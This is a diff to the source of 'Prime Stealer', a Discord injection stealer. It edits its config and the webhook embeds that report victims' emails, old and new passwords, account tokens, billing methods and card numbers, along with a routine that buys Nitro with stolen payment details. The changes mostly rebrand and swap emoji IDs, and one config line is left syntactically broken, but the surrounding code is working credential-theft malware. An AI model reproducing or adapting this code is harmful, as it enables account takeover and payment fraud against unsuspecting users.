@@ -11,11 +11,13 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Prime Injection',
-  embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/SheLuvDx/injection/main/index.js', 
-
+  embed_name: 'Prime Stealer | Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'(/ /g, '%20'), 
+  embed_color: 0x00000000, 
+  injection_url: '', 
+  /**
+   
+   **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -491,21 +493,21 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return '?';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += '?? ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '<:paypal:951139189389410365>';
           break;
       }
     }
   });
-  if (!billing) billing = '❌';
+  if (!billing) billing = '?';
   return billing;
 };
 
@@ -533,7 +535,7 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
+  const failedMsg = 'Failed to Purchase ?';
   if (!data) return failedMsg;
 
   let IDS = [];
@@ -659,16 +661,16 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `<:mail:1069997090266173500> Email: **${email}** - <:blacklock:1069101792736051221> Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -678,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
+            text: 'Prime Injection',
             icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
@@ -702,16 +704,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
+            value: `<:mail:1069997090266173500> Email: **${json.email}**\n<:blacklock:1069101792736051221> Old Password: **${oldpassword}**\n<:blacklock:1069101792736051221> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -721,7 +723,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
+            text: 'Prime Injection',
             icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
@@ -745,16 +747,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `<:mail:1069997090266173500> New Email: **${email}**\n<:blacklock:1069101792736051221> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -764,7 +766,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
+            text: 'Prime Injection',
             icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
@@ -788,16 +790,16 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `Time to buy some nitro baby ??`,
             inline: false,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -807,7 +809,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
+            text: 'Prime Injection',
             icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
@@ -836,11 +838,11 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -850,7 +852,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
+            text: 'Prime Injection',
             icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
@@ -881,11 +883,11 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -895,7 +897,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'PrimeStealer Injection・https://github.com/SheLuvDx',
+            text: 'Prime Injection',
             icon_url: "https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg"
         },
       },
